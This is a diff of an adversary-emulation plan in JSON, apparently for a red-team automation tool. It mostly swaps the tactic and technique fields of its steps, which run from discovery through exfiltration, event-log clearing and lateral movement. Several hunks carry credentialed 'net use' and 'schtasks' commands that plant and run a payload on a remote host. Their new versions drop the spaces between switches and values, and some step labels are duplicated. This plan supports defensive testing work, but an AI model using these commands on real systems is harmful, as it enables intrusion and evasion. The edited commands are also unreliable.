@@ -9,16 +9,16 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -27,8 +27,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -37,8 +37,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -49,16 +49,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -68,8 +68,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -79,8 +79,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -93,8 +93,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -106,8 +106,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -119,8 +119,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -132,8 +132,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t1_3",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -145,8 +145,8 @@
             }
         },
         {
-            "tactic": "SystemOwnerUserDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -158,8 +158,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -171,8 +171,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -184,8 +184,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConnectionsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -197,8 +197,8 @@
             }
         },
         {
-            "tactic": "LocalAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalAccount",
             "label": "localAccount_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -207,8 +207,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -220,8 +220,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -233,8 +233,8 @@
             }
         },
         {
-            "tactic": "LocalGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalGroups",
             "label": "LocalGroups_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -246,8 +246,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -259,8 +259,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -272,8 +272,8 @@
             }
         },
         {
-            "tactic": "BrowserBookmarkDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -282,8 +282,8 @@
             }
         },
         {
-            "tactic": "DomainTrustDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -295,8 +295,8 @@
             }
         },
         {
-            "tactic": "LocalEmailCollection",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -305,8 +305,8 @@
             }
         },
         {
-            "tactic": "TimeStomp",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "TimeStomp",
             "label": "timeStomp_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -315,8 +315,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "networkShareDiscovery_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -325,8 +325,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "networkShareDiscovery_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -338,8 +338,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -351,8 +351,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -364,8 +364,8 @@
             }
         },
         {
-            "tactic": "DomainGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainGroups",
             "label": "domainGroups_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -377,8 +377,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -391,8 +391,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -402,8 +402,8 @@
             }
         },
         {
-            "tactic": "ClearWindowsEventLogs",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t1_1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -412,8 +412,8 @@
             }
         },
         {
-            "tactic": "FileDeletion",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t1_2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -425,8 +425,8 @@
             }
         },
         {
-            "tactic": "RemoteServices_NetUse",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -436,8 +436,8 @@
             }
         },
         {
-            "tactic": "RemoteFileCopy_RoboCopy",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteFileCopy_RoboCopy",
             "label": "remoteServices_filecopy_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -447,8 +447,8 @@
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "scheduled_task_t1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -458,8 +458,8 @@
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution_t1",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -470,8 +470,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_2",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -481,8 +481,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -494,8 +494,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -507,8 +507,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -520,8 +520,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t2_3",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -533,8 +533,8 @@
             }
         },
         {
-            "tactic": "SystemOwnerUserDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -546,8 +546,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -559,8 +559,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -572,8 +572,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConnectionsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -585,8 +585,8 @@
             }
         },
         {
-            "tactic": "LocalAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalAccount",
             "label": "localAccount_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -595,8 +595,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -608,8 +608,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -621,8 +621,8 @@
             }
         },
         {
-            "tactic": "LocalGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalGroups",
             "label": "LocalGroups_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -634,8 +634,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -647,8 +647,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -660,8 +660,8 @@
             }
         },
         {
-            "tactic": "BrowserBookmarkDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -670,8 +670,8 @@
             }
         },
         {
-            "tactic": "DomainTrustDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -683,8 +683,8 @@
             }
         },
         {
-            "tactic": "LocalEmailCollection",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -693,8 +693,8 @@
             }
         },
         {
-            "tactic": "TimeStomp",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "TimeStomp",
             "label": "localEmailCollection_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -703,8 +703,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -713,8 +713,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -726,8 +726,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -739,8 +739,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t2_2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -752,8 +752,8 @@
             }
         },
         {
-            "tactic": "DomainGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainGroups",
             "label": "domainGroups_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -765,8 +765,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -779,8 +779,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t2_1",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -790,8 +790,8 @@
             }
         },
         {
-            "tactic": "ClearWindowsEventLogs",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -800,8 +800,8 @@
             }
         },
         {
-            "tactic": "FileDeletion",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -813,8 +813,8 @@
             }
         },
         {
-            "tactic": "RemoteServices_NetUse",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteServices_NetUse",
             "label": "remoteServices_netuse_t2",
             "preconditions": {
                 "agent": "self.agent_tgt1",
@@ -822,13 +822,13 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": "net use \\\\${self.target_3_hostname} /User:${self.target_3_username}@${self.domain} ${self.target_3_password}"
+                    "command": "net use \\\\${self.target_3_hostname}/User:${self.target_3_username}@${self.domain}${self.target_3_password}"
                 }
             }
         },
         {
-            "tactic": "RemoteFileCopy_RoboCopy",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "RemoteFileCopy_RoboCopy",
             "label": "remoteServices_filecopy_t2",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -838,8 +838,8 @@
             }
         },
         {
-            "tactic": "ScheduledTask",
-            "technique": "LateralMovement",
+            "tactic": "LateralMovement",
+            "technique": "ScheduledTask",
             "label": "scheduled_task",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -848,13 +848,13 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN ${self.target_3_taskname} /TR ${self.target_3_file_location}\\${self.payload_name} /RL Highest /U ${self.target_3_username}@${self.domain} /P ${self.target_3_password} /RU ${self.target_3_username}@${self.domain} /RP ${self.target_3_password} /S ${self.target_3_hostname}"
+                    "command": "cmd.exe /c schtasks.exe /create /f /SC once /ST 23:59 /TN${self.target_3_taskname}/TR${self.target_3_file_location}\\${self.payload_name}/RL Highest /U${self.target_3_username}@${self.domain}/P${self.target_3_password}/RU${self.target_3_username}@${self.domain}/RP${self.target_3_password}/S${self.target_3_hostname}"
                 }
             }
         },
         {
-            "tactic": "ScheduledTaskExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "ScheduledTaskExecution",
             "label": "scheduled_task_execution",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -863,13 +863,13 @@
                 "target_1": "self.target_2",
                 "target_2": "self.target_3",
                 "tune": {
-                    "command": "cmd.exe /c schtasks.exe /run /tn ${self.target_3_taskname} /U ${self.target_3_username}@${self.domain} /P ${self.target_3_password} /S ${self.target_3_hostname}"
+                    "command": "cmd.exe /c schtasks.exe /run /tn${self.target_3_taskname}/U${self.target_3_username}@${self.domain}/P${self.target_3_password}/S${self.target_3_hostname}"
                 }
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_3",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -879,8 +879,8 @@
             }
         },
         {
-            "tactic": "ProcessDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "ProcessDiscovery",
             "label": "ProcessDiscovery_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -892,8 +892,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -905,8 +905,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -918,8 +918,8 @@
             }
         },
         {
-            "tactic": "SystemInformationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemInformationDiscovery",
             "label": "systemInformationDiscovery_t3_3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -931,8 +931,8 @@
             }
         },
         {
-            "tactic": "SystemOwnerUserDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemOwnerUserDiscovery",
             "label": "systemOwnerUserDiscovery_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -944,8 +944,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -957,8 +957,8 @@
             }
         },
         {
-            "tactic": "SystemTimeDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemTimeDiscovery",
             "label": "SystemTimeDiscovery_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -970,8 +970,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConnectionsDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConnectionsDiscovery",
             "label": "systemNetworkConnectionsDiscovery_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -983,8 +983,8 @@
             }
         },
         {
-            "tactic": "LocalAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalAccount",
             "label": "localAccount_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -993,8 +993,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1006,8 +1006,8 @@
             }
         },
         {
-            "tactic": "DomainAccount",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainAccount",
             "label": "DomainAccount_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1019,8 +1019,8 @@
             }
         },
         {
-            "tactic": "LocalGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "LocalGroups",
             "label": "LocalGroups_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1032,8 +1032,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1045,8 +1045,8 @@
             }
         },
         {
-            "tactic": "SystemServiceDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemServiceDiscovery",
             "label": "SystemServiceDiscovery_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1058,8 +1058,8 @@
             }
         },
         {
-            "tactic": "BrowserBookmarkDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "BrowserBookmarkDiscovery",
             "label": "BrowserBookmarkDiscovery_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1068,8 +1068,8 @@
             }
         },
         {
-            "tactic": "DomainTrustDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainTrustDiscovery",
             "label": "DomainTrustDiscovery_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1081,8 +1081,8 @@
             }
         },
         {
-            "tactic": "LocalEmailCollection",
-            "technique": "Collection",
+            "tactic": "Collection",
+            "technique": "LocalEmailCollection",
             "label": "localEmailCollection_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1091,8 +1091,8 @@
             }
         },
         {
-            "tactic": "TimeStomp",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "TimeStomp",
             "label": "localEmailCollection_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1101,8 +1101,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1111,8 +1111,8 @@
             }
         },
         {
-            "tactic": "NetworkShareDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "NetworkShareDiscovery",
             "label": "NetworkShareDiscovery_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1124,8 +1124,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1137,8 +1137,8 @@
             }
         },
         {
-            "tactic": "SystemNetworkConfigurationDiscovery",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "SystemNetworkConfigurationDiscovery",
             "label": "systemNetworkConfigurationDiscovery_t3_2",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1150,8 +1150,8 @@
             }
         },
         {
-            "tactic": "DomainGroups",
-            "technique": "Discovery",
+            "tactic": "Discovery",
+            "technique": "DomainGroups",
             "label": "domainGroups_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1163,8 +1163,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1177,8 +1177,8 @@
             }
         },
         {
-            "tactic": "ExfiltrationOverWebService",
-            "technique": "Exfiltration",
+            "tactic": "Exfiltration",
+            "technique": "ExfiltrationOverWebService",
             "label": "exfiltrationOverWebService_t3_1",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1188,8 +1188,8 @@
             }
         },
         {
-            "tactic": "ClearWindowsEventLogs",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "ClearWindowsEventLogs",
             "label": "clearWindowsEventLogs_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1198,8 +1198,8 @@
             }
         },
         {
-            "tactic": "FileDeletion",
-            "technique": "DefenseEvasion",
+            "tactic": "DefenseEvasion",
+            "technique": "FileDeletion",
             "label": "clearWindowsEventLogs_t3",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1211,8 +1211,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt3",
@@ -1221,8 +1221,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt2",
@@ -1231,8 +1231,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
